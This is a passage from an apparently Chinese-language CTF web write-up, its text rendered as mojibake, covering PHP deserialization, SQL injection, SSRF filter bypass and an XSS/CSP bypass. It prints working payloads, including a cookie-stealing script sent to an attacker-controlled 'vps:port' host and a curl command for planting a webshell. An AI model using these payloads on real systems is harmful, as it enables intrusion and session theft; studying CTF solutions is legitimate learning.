ï¼Œfileåè®®åŠ localhostç›´æ¥è¯»ã€‚ä¼°è®¡è·Ÿhgame week2é‚£é¢˜ä¸€æ¨¡ä¸€æ ·çš„åç«¯ä»£ç ã€‚æ ¹æ®æç¤ºè¯»åˆ°æŸä¸ªé‡è¦php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">trick</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $gf;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">content_to_file</span><span class="params">($content)</span></span>&#123;</span><br><span class="line">$passwd = $_GET[<span class="string">'pass'</span>];</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/^[a-z]+\.passwd$/m'</span>,$passwd)) </span><br><span class="line">&#123; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(strpos($passwd,<span class="string">"20200202"</span>))&#123;</span><br><span class="line"><span class="keyword">echo</span> file_get_contents(<span class="string">"/"</span>.$content);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">aiisc_to_chr</span><span class="params">($number)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(strlen($number)&gt;<span class="number">2</span>)&#123;</span><br><span class="line">$str = <span class="string">""</span>;</span><br><span class="line"> $number = str_split($number,<span class="number">2</span>);</span><br><span class="line"> <span class="keyword">foreach</span> ($number <span class="keyword">as</span> $num ) &#123;</span><br><span class="line"> $str = $str .chr($num);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">return</span> strtolower($str);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> chr($number);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">calc</span><span class="params">()</span></span>&#123;</span><br><span class="line">$gf=<span class="keyword">$this</span>-&gt;gf;</span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">'/[a-zA-z0-9]|\&amp;|\^|#|\$|%/'</span>, $gf))&#123;</span><br><span class="line">  <span class="keyword">eval</span>(<span class="string">'$content='</span>.$gf.<span class="string">';'</span>);</span><br><span class="line">  $content =  <span class="keyword">$this</span>-&gt;aiisc_to_chr($content); </span><br><span class="line">  <span class="keyword">return</span> $content;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content_to_file(<span class="keyword">$this</span>-&gt;calc());</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">unserialize((base64_decode($_GET[<span class="string">'code'</span>])));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å±å®ä½©æœå‡ºé¢˜äººasciiç éƒ½èƒ½æ‰“é”™ã€‚<br>ä¸Šé¢ä¸€å±‚æ¢è¡Œç¬¦ç»•è¿‡passwordçš„æ ¡éªŒ<br><code>a.passwd%0a20200202</code><br>ä¸‹é¢æœ‰ç‚¹åƒphpé‡Œçš„æ„é€ æŠ€å·§å¯ä»¥ç”¨å–åï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨å¤æ‚çš„å­—ç¬¦æ‹¼æ¥flagå¤§å†™asciiç çš„æ•°å­—ã€‚<br>exp</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class trick&#123;</span><br><span class="line">    public $gf;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;*</span><br><span class="line">$abc&#x3D;&quot;FLAG&quot;;</span><br><span class="line">for($i&#x3D;0;$i&lt;&#x3D;strlen($abc);$i++)&#123;</span><br><span class="line">    echo(ord($abc[$i]));</span><br><span class="line">&#125;*&#x2F;</span><br><span class="line">#70766571</span><br><span class="line">$o&#x3D;new trick();</span><br><span class="line">$o-&gt;gf&#x3D;&#39;~&#39;.~&#39;70766571&#39;;#~\xC8\xCF\xC8\xC9\xC9\xCA\xC8\xCE</span><br><span class="line">echo(base64_encode(serialize($o)));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h1 id="sqlcheckin"><a href="#sqlcheckin" class="headerlink" title="sqlcheckin"></a>sqlcheckin</h1><p>ä¸€ä¸ªå˜ç§çš„ä¸‡èƒ½å¯†ç ï¼Œè¿˜å±…ç„¶æ˜¯ä¸ªåŸé¢˜ã€‚å¯æƒœæ²¡åšè¿‡ã€‚<br>è¯­å¥å¾ˆæ¸…æ™°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$stmt = $pdo-&gt;prepare(<span class="string">"SELECT username from users where username='$&#123;_POST['username']&#125;' and password='$&#123;_POST['password']&#125;'"</span>);</span><br></pre></td></tr></table></figure><p>è¿™æ¬¡å› ä¸ºä¸Šé¢é‚£é“å‘é¢˜åˆæŸ¥äº†ä¸å°‘sqlæ³¨å…¥çš„èµ„æ–™ï¼Œä¸­é—´ä¹Ÿå­¦åˆ°äº†ä¸€ä¸ªtrickï¼Œæ¯”å¦‚æ­¤é¢˜payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">admin</span><br><span class="line">&#39;-0-&#39;   or    &#39;^0^&#39;     </span><br><span class="line">acdvvadva&#39; &amp;&#39;1 #å‰é¢éšä¾¿ä¸€ä¸ªå­—ç¬¦ä¸²</span><br><span class="line">éƒ½å¯</span><br></pre></td></tr></table></figure><p>å®é™…å°±æ˜¯åˆ©ç”¨äº†mysqlé‡Œå­—ç¬¦çš„ç‰¹æ€§ã€‚æ¯”å¦‚ä¸‡èƒ½å¯†ç <br><code>username=&#39;admin&#39;-0-&#39;&#39;</code>é‡Œmysqlä¼šæŠŠadminè½¬ä¸ºæ•°å­—ï¼Œå› ä¸ºå®ƒè·Ÿæ•°å­—è¿ç®—äº†ã€‚å¦‚æœè¿™é‡Œ0æ¢æˆ1ç›¸å½“äº<code>username=-1</code>ï¼Œå±äºé”™è¯¯ã€‚å¦‚æœæ¢æˆ<code>username=0</code>åˆ™ç›´æ¥è¿”å›æ‰€æœ‰ç»“æœã€‚<br>åŒç†ï¼Œè¿™ä¸ªæ€è·¯å¯ä»¥å¸¦åˆ°å¼‚æˆ–ã€‚è¿›ä¸€æ­¥è¿˜å¯ä»¥ç”¨åœ¨æŸäº›è¿‡æ»¤è¾ƒå¤šçš„ç›²æ³¨ä¸‹ï¼Œæ¯”å¦‚è¿‡æ»¤äº†æ³¨é‡Šç¬¦å·æ—¶çš„å¸ƒå°”ç›²æ³¨ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload&#x3D;&#39;-(1&#x3D;1)-&#39;    å¸ƒå°”å€¼å‡</span><br><span class="line">payload&#x3D;&#39;-(1&#x3D;0)-&#39;    å¸ƒå°”å€¼çœŸ</span><br><span class="line">...</span><br><span class="line">payload&#x3D;&#39;-(length(database())&#x3D;12)-&#39;</span><br></pre></td></tr></table></figure><h1 id="hackme"><a href="#hackme" class="headerlink" title="hackme"></a>hackme</h1><p>æœ€æ—©åšçš„ä¸€é“é¢˜ã€‚å…¶å®æ€è·¯è›®æ¸…æ™°çš„ï¼Œä½†æ˜¯åæ¥æ²¡åšäº†ã€‚å…¶å®æœ‰ä¸€éƒ¨åˆ†åŸå› æ˜¯å› ä¸ºè‡ªå·±æœ€åä¸€æ­¥5å­—å‘½ä»¤æ‰§è¡ŒhitconåŸé¢˜ä¸€ç›´æ²¡åšå‡ºæ¥è¿‡ã€‚è¿·æƒ‘ã€‚<br>å¼€å§‹æ˜¯å®¡è®¡æºç ï¼Œåœ¨profile.phpä¸­å‘ç°æœ‰ä¸€ä¸ªsession.serialize_handleråºåˆ—åŒ–å¤„ç†å™¨ä¸åŒçš„é—®é¢˜ã€‚æ‰€ä»¥åªè¦æŠŠåºåˆ—åŒ–æ•°æ®å†™è¿›sessionå¹¶æ»¡è¶³ä»–<code>this-&gt;admin=1</code>çš„æ¡ä»¶å³å¯ã€‚<br>è¿™é¢˜æä¾›äº†ä¸€ä¸ªç°æˆçš„å¯æ§å‚æ•°ã€‚æ‰€ä»¥ä¸éœ€è¦åƒåŸæ¥jarvisojä¸Šåšçš„ä¸€é“é¢˜é‚£æ ·æ„é€ ä¸€ä¸ªä¸Šä¼ å†™å…¥session.<br>è¿›å…¥profileåå¯ä»¥çœ‹åˆ°æºç æ˜¯hitconåŸé¢˜ï¼Œä½†æ˜¯å‰é¢åŠ äº†ä¸€å±‚è¿‡æ»¤<br>å…¶å®å°±æ˜¯ç»å…¸çš„<code>filtervar+pregmatch</code><br>ä¹‹å‰æ›¾ç»æ•´ç†è¿‡ssrfçš„ç»å…¸wafï¼š<a href="https://www.jianshu.com/p/095f233cc9d5" target="_blank" rel="noopener">https://www.jianshu.com/p/095f233cc9d5</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   <span class="keyword">echo</span> <span class="string">"Argument: "</span>.$argv[<span class="number">1</span>].<span class="string">"\n"</span>;</span><br><span class="line">   <span class="comment">// check if argument is a valid URL</span></span><br><span class="line">   <span class="keyword">if</span>(filter_var($argv[<span class="number">1</span>], FILTER_VALIDATE_URL)) &#123;</span><br><span class="line">      <span class="comment">// parse URL</span></span><br><span class="line">      $r = parse_url($argv[<span class="number">1</span>]);</span><br><span class="line">      print_r($r);</span><br><span class="line">      <span class="comment">// check if host ends with google.com</span></span><br><span class="line">      <span class="keyword">if</span>(preg_match(<span class="string">'/google\.com$/'</span>, $r[<span class="string">'host'</span>])) &#123;</span><br><span class="line">         <span class="comment">// get page from URL</span></span><br><span class="line">         exec(<span class="string">'curl -v -s "'</span>.$r[<span class="string">'host'</span>].<span class="string">'"'</span>, $a);</span><br><span class="line">         print_r($a);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">         <span class="keyword">echo</span> <span class="string">"Error: Host not allowed"</span>;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">"Error: Invalid URL"</span>;</span><br><span class="line">   &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å½“æ—¶payloadæ˜¯<code>0://evil.com:80;google.com:80</code><br>ä½†æ˜¯æ­¤é¢˜å…¶å®è·Ÿbytectfçš„boringcodeæ›´åƒã€‚å¹¸å¥½è‡ªå·±æ¯”èµ›å‰å‡ å¤©æ‰å¤ç°è¿‡ã€‚å…·ä½“ç»†èŠ‚ä¸Šå°±æ˜¯å°†hostçš„googleæ”¹ä¸ºbaiduï¼ŒåŠ äº†ä¸€å±‚dataåè®®çš„è¿‡æ»¤ã€‚ä»¥åŠssrfæ–¹å¼å˜ä¸º<code>file_get_contents()</code><br>æ³¨æ„ï¼ŒåŸæœ¬curlçš„æ—¶å€™æˆ‘ä»¬æ˜¯æœ‰å¤šè§£çš„ã€‚ä½†æ˜¯ssrfæ¢æˆ<code>file_get_contents()</code>è¯·æ±‚åªæœ‰ä¸€ç§æ™®éçš„æ–¹å¼å°±æ˜¯<code>data://google.com/plain;base64,SSBsb3ZlIFBIUAo=</code><br>hoståçš„å†…å®¹ç›´æ¥ä»¥è·¯å¾„ç»•è¿‡ã€‚å¹¶ä¸”ä½œä¸ºè¯·æ±‚å†…å®¹è¾“å‡ºã€‚<br>æ­¤é¢˜è¿‡æ»¤äº†dataï¼Œä¸bytectfä¸€è‡´ã€‚å½“æ—¶æˆ‘çœ‹åˆ°boringcodeè¿™é¢˜å¾ˆå¤šæˆ˜é˜Ÿè§£å†³æ–¹æ³•æ˜¯è´­ä¹°åŸŸåç»•è¿‡å¯¹hostçš„é™åˆ¶ã€‚é™¤æ­¤ä¹‹å¤–è¿˜æœ‰è¯´ç”¨baidu302è·³è½¬çš„ï¼Œè¿™é‡Œæ˜¾ç„¶ä¸è¡Œï¼›æœ‰è¯´ç”¨ftpåè®®çš„ï¼Œæˆ‘è¯•è¿‡ä¹Ÿä¸è¡Œã€‚å½“æ—¶è¿˜å‰©ä¸‹ä¸€ç§è§£å†³æ–¹æ³•æˆ‘è¯•äº†ä¸€ä¸‹å‘ç°å¯ä»¥ï¼Œå°±æ˜¯<code>compress.zlib://data:@baidu.com/baidu.com?,echo(scandir(&#39;.&#39;));</code>è€Œä¸”ç›´æ¥ä»è·¯å¾„è·å–å†…å®¹æ¯”å¦ä¸€ç§æ–¹æ³•ç®€å•è®¸å¤šã€‚</p><p>æ‰€ä»¥æ­¤é¢˜ç›´æ¥ä½¿ç”¨è¿™ä¸€æ–¹æ³•å°±èƒ½ç»•è¿‡æ ¡éªŒäº†ã€‚<br><code>compress.zlib://data:@127.0.0.1/plain;base64,</code><br>åé¢hitconçš„å†…å®¹ä¸å¤šè¯´ã€‚æˆ‘è§‰å¾—è‡ªå·±è™½ç„¶orangeçš„è„šæœ¬ç”¨ä¸å‡ºæ¥ï¼Œå…¶ä»–æ–¹æ³•è¯´ä¸å®šå¯ä»¥ã€‚æ¯”å¦‚æŠŠé‡Œé¢çš„å‘½ä»¤æ¢æˆ<code>curl vps ip &gt; a.php</code><br>å†™å…¥ä¸€å¥è¯ã€‚</p><h1 id="happyvacation"><a href="#happyvacation" class="headerlink" title="happyvacation"></a>happyvacation</h1><p>æœ‰æ„æ€çš„é¢˜ç›®ï¼Œå°±æ˜¯æˆ‘payloadå‡ ä¹éƒ½å®Œæˆäº†ç»“æœæ²¡åšå‡ºæ¥ã€‚æ³ªæµæ»¡é¢ã€‚<br>å¼€å§‹ç¬¬ä¸€å¤©å‘ç°æ˜¯ä¸ªCSP,åŠ ä¸Šæœ‰ä¸ªæ–‡ä»¶ä¸Šä¼ ç‚¹ã€‚ç›´æ¥å°±çŒœæ˜¯xss+cspbypassã€‚ç»“æœè¯•äº†ä¸‹å‘ç°ä¸ªåˆ«å‚æ•°ä¸€å †è¿‡æ»¤è¿˜æœ‰æ²¡æ‰¾åˆ°xssçš„ç‚¹ã€‚ç¬¬äºŒå¤©æ‰çŸ¥é“æœ‰gitæºç æ³„éœ²ï¼Œç«‹é©¬åŸåœ°å¤æ´»ã€‚<br>æ¯”èµ›æ—¶æ•´ç†çš„è¦ç‚¹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">1.$messageå¯æ§ï¼Œç»•è¿‡preg_match&#39;&#x2F;coo|&lt;|ja|\&amp;|\\\|&gt;|win&#x2F;i&#39;å</span><br><span class="line">addslashesåå­˜å‚¨èµ·æ¥</span><br><span class="line">ç„¶åshowmessage()é‡Œè°ƒç”¨äº†echo &quot;&lt;body&gt;&lt;script&gt; var a &#x3D; &#39;&#123;$this-&gt;info-&gt;message&#125;&#39;;document.write(a);&lt;&#x2F;script&gt;&lt;&#x2F;body&gt;&quot;;</span><br><span class="line"></span><br><span class="line">2.$answerå¯æ§</span><br><span class="line">ç»•è¿‡preg_match &quot;&#x2F;[^a-zA-Z_\-&#125;&gt;@\]*]&#x2F;i&quot;è·Ÿ</span><br><span class="line">&#x2F;f|sy|and|or|j|sc|in&#x2F;i</span><br><span class="line">æ‹¼æ¥è¿›eval(eval(&quot;\$this-&gt;&quot;.$answer.&quot; &#x3D; false;&quot;);)</span><br><span class="line"></span><br><span class="line">3.$refererå¯æ§</span><br><span class="line">è·³è½¬</span><br><span class="line">4.æ–‡ä»¶ä¸Šä¼ </span><br><span class="line">ç¦äº†[&#39;ph&#39;, &#39;ht&#39;, &#39;sh&#39;, &#39;pe&#39;, &#39;j&#39;, &#39;&#x3D;&#39;, &#39;co&#39;, &#39;\\&#39;, &#39;&quot;&#39;, &#39;\&#39;&#39;]</span><br></pre></td></tr></table></figure><p>è¿™é‡ŒCSPå†™çš„å¾ˆåŸºæœ¬ï¼Œå°±æ˜¯ä¸ªå…è®¸åŒæºè„šæœ¬ï¼Œè€Œä¸”å¼€æ”¾äº†unsafe-inlineã€‚è¿™ç§ç»™äº†æ–‡ä»¶ä¸Šä¼ çš„jså°±æ˜¯ç™½ç»™ã€‚CSPè½»æ¾è§£å†³ã€‚ç°åœ¨å…³é”®æ˜¯wafã€‚<br>$messageæ˜¯ä¼ æ‰“xssçš„è¯­å¥çš„ã€‚ä½†æ˜¯è¿‡äº†ä¸€å±‚addslashesåè¢«å†™å…¥è¯­å¥ï¼Œæ„å‘³ç€å¿…é¡»è¦è§£å†³å®½å­—ç¬¦çš„é—®é¢˜ã€‚è¿™é‡Œå¦‚æœæ˜¯å¸¸è§„æ–¹æ³•å¯ä»¥åœ¨é‡Œé¢å†å†™ä¸€ä¸ª<code>script</code>å†…å®¹ç»•è¿‡ã€‚å¯æ˜¯æ ‡ç­¾è¢«è¿‡æ»¤äº†ã€‚åªèƒ½è€ƒè™‘å…¶ä»–æ–¹æ³•ã€‚</p><p>$answeråº”è¯¥æ˜¯è¦åˆ©ç”¨çš„ï¼Œæœ€ç»ˆå¯ä»¥å®ç°ä¸€ä¸ªevalè¯­å¥ï¼Œä½†æ˜¯ä¸¥æ ¼é™åˆ¶æˆ‘ä»¬åªèƒ½å°†æŸä¸ªå±æ€§ç½®ä¸ºfalseã€‚</p><p>lib.phpå¯ä»¥çœ‹è§ä¸€æ®µå…³é”®å‡½æ•°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">go</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;pre) <span class="keyword">and</span> <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;after) <span class="keyword">and</span> <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;location))&#123;</span><br><span class="line">$dest = <span class="keyword">$this</span>-&gt;pre . <span class="keyword">$this</span>-&gt;location . <span class="keyword">$this</span>-&gt;after;</span><br><span class="line">header($dest);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="comment">// Error occured?</span></span><br><span class="line">header(<span class="string">"Location: index.php"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;flag)&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;location !== <span class="keyword">$this</span>-&gt;page)&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;go();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">ob_end_flush();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸€ä¸ª<code>destruct</code>æ–¹æ³•ï¼Œåœ¨flagä¸ºtrueæ—¶ä¼šè°ƒç”¨<code>go</code>ï¼Œç„¶åï¼Œgoå¾ˆå¥‡å¦™çš„æ‹¼æ¥äº†ä¸‰ä¸ªå‚æ•°è¿›è¡Œ<code>header()</code>è®¾è®¡ã€‚<br>é‚£ä¹ˆæ˜¯å¦åªè¦æˆ‘ä»¬æŠŠheaderæ§åˆ¶ä¸ºgbkç¼–ç ï¼Œå°±å¯ä»¥è§£å†³å‰é¢xssè¢«è½¬ä¹‰çš„é—®é¢˜å‘¢ï¼Ÿæ²¡é”™ã€‚æ‰€ä»¥è¿™é‡Œå°±æ˜¯å…¥æ‰‹ç‚¹ã€‚è½¬è€Œè·Ÿè¿›ä¸‹å…³é”®å‡½æ•°ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if($user-&gt;url-&gt;referer !&#x3D; $user-&gt;url-&gt;page)&#123;</span><br><span class="line">            $user-&gt;url-&gt;location &#x3D; $user-&gt;url-&gt;referer;</span><br><span class="line">        &#125;</span><br><span class="line">        $user-&gt;url-&gt;flag &#x3D; True;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆï¼Œä¼ å€¼answeræ—¶å°±ä¼šè¿›è¡Œflag=1èµ‹å€¼ï¼ŒåŒæ—¶locationå‚æ•°ä¼šèµ‹å€¼ä¸ºæˆ‘ä»¬å¯æ§çš„refererã€‚é‚£ä¹ˆæˆ‘ä»¬çš„ç›®æ ‡å˜æˆé€šè¿‡refereræ§åˆ¶headerã€‚<br>ä¸ºæ­¤å°±è¦è§£å†³<code>pre</code>è¿™ä¸ªæ‹¼æ¥çš„å±æ€§ã€‚è¿™æ—¶æˆ‘ä»¬å‰é¢çš„evalè¯­å¥å°±èµ·ä½œç”¨äº†ã€‚å¦‚æœæŠŠ<code>this-&gt;pre</code>è®¾ä¸ºfalse,åœ¨æ‹¼æ¥æ—¶å®ƒå°±ä¼šå˜æˆç©ºã€‚é‚£ä¹ˆæˆ‘ä»¬çš„å¯æ§å‚æ•°locationç›´æ¥ä¼ è¿›headerã€‚<br>æ—¢ç„¶å¦‚æ­¤ï¼Œpayloadå°±å¯ä»¥æ„é€ äº†ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?answer&#x3D;user-&gt;url-&gt;pre&amp;referer&#x3D;Content-Type:text&#x2F;html; charset&#x3D;GBK;abc&#x3D;</span><br></pre></td></tr></table></figure><p>æ­¤å¤„éšä¾¿ç”¨<code>abc</code>ä¹‹ç±»çš„æ‹¼æ¥ä¸‹åé¢çš„<code>this-&gt;after</code>å±æ€§å€¼.phpã€‚<br>è¿™æ ·æˆ‘ä»¬çš„index.phpç»ˆäºå¯ä»¥æ‰“xssäº†ï¼Œå¯ä»¥é€ƒé€¸å•å¼•å·ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;index.php?message&#x3D;%c0%27; alert(1);&#x2F;&#x2F;</span><br></pre></td></tr></table></figure><p>ç°åœ¨æƒ³æ¥æˆ‘æ¯”èµ›æ—¶å°±æ˜¯è¿™ä¹ˆæ‰“çš„ã€‚ä½†æ˜¯<code>alert(1)</code>æ²¡æˆï¼Œæˆ‘ä»¥ä¸ºæ˜¯payloadé—®é¢˜å°±æ²¡ç»§ç»­åšäº†â€¦â€¦.ç°åœ¨æƒ³æƒ³å®åœ¨æ˜¯æ‹‰èƒ¯ï¼Œè¿™ä¸ªpayloadå°±æ²¡é—®é¢˜å•Šï¼Œä¼°è®¡æ˜¯æˆ‘å“ªé‡Œç»†èŠ‚æœ‰é—®é¢˜å•Šï¼Œåº”è¯¥ç»§ç»­åšä¸‹å»çš„ï¼Œè‰ã€‚<br>ç„¶åå°±æ˜¯å¸¸è§„é—®é¢˜äº†ï¼Œä¸ºäº†è§£å†³æ²¡æœ‰å•å¼•å·çš„é—®é¢˜ä½¿ç”¨string.fromCharCodeï¼Œè¿™ä¸ªæˆ‘ä¹Ÿé¢„å…ˆæƒ³å¥½äº†è¿™æ ·å†™payloadï¼Œå±…ç„¶å› ä¸ºæå‰æ”¾å¼ƒæ²¡ç”¨å‡ºæ¥ï¼Œè¯¥æ‰“ã€‚<br>ç„¶åå°±å¯ä»¥åŠ è½½å†…è”è„šæœ¬äº†ã€‚åŒæ ·å¾ˆç®€å•ï¼Œå› ä¸ºCSPçš„åŸå› å§srcè®¾ç½®æˆä¸Šä¼ æ–‡ä»¶è·¯å¾„å³å¯ã€‚è¿™é‡Œæˆ‘çœ‹æ¢…å­é…’å­¦é•¿çš„æ–‡ç« ä»‹ç»çš„æ˜¯ç”¨.waveæ–‡ä»¶bypassCSPçš„ã€‚ä¸è¿‡ä¹‹å‰çœ‹è¿‡æ–‡ç« ä»‹ç»è¿‡jpegæˆ–è€…å…¶ä»–æ–‡ä»¶bypassCSPä¹Ÿæ˜¯å¯è¡Œçš„ã€‚ä¸è¿‡éœ€è¦è®¾è®¡ä¸€ä¸‹æ–‡ä»¶å¤´ã€‚<br>æ‰€ä»¥payloadæ„é€ ä¸‹ï¼š<br>ä¸Šä¼ å›¾ç‰‡å†…å®¹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aaaaaaaaaaaaaaa&#x2F;*bbbbbbbbbbbbbbbbbbb*&#x2F;&#x3D;&#39;test&#39;;window.open(&#39;http:&#x2F;&#x2F;vps:port&#x2F;?&#39;+document.cookie);</span><br></pre></td></tr></table></figure><p>index.phpæ„é€ message</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">%c0%<span class="number">27</span>; </span><br><span class="line"><span class="keyword">var</span> x=<span class="built_in">document</span>.createElement(<span class="string">'script'</span>);</span><br><span class="line">x.src=<span class="string">'/upload/xxxxx/test.wave'</span></span><br><span class="line"><span class="built_in">document</span>.body.appendChild(x);<span class="comment">//</span></span><br></pre></td></tr></table></figure><p>æœ€åpayloadè½¬ä¸€ä¸‹charcodeåº”è¯¥å°±è¡Œäº†ã€‚</p><p>è¿™é‡Œå†è†œä¸€ä¸‹æ˜Ÿç›Ÿè·ŸNu1Lç­‰ç­‰æˆ˜é˜Ÿçš„å¸ˆå‚…ä»¬ï¼Œæ•´äº†ä¸ªå·¨ç®€å•çš„éé¢„æœŸã€‚ä¸Šé¢evalè¦†ç›–çš„åœ°æ–¹ç”±äºå‰é¢è°ƒç”¨äº†ä¸€ä¸ªcloneï¼Œæ‰€ä»¥ç›¸å½“äºæ˜¯ä¸ªæ–°çš„userã€‚è¿™æ ·çš„è¯userçš„å±æ€§éƒ½å¯ä»¥æ”¹ã€‚ç”±äºæºç æ‰€æœ‰åŠŸèƒ½éƒ½åœ¨userç±»å®ç°çš„ï¼Œé‚£å°±æ˜¯ä»»æ„å±æ€§éƒ½å¯æ”¹ã€‚ç›´æ¥æŠŠé»‘åå•è¦†ç›–æˆfalse.ç„¶åä¸Šä¼ phpgetshellã€‚flagåœ¨æ 